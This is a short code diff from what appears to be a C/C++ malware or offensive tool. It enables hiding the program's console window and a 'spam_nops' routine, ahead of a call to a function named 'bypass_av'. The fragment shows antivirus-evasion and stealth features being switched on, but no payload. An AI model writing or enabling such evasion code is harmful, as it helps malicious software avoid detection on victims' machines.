@@ -478,10 +478,10 @@ int main(){
 
     int result;
 
-    // HWND hWnd = GetConsoleWindow();
-    // ShowWindow(hWnd, SW_HIDE);
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
 
-    // spam_nops();
+    spam_nops();
 
 
     if (bypass_av() != 0){
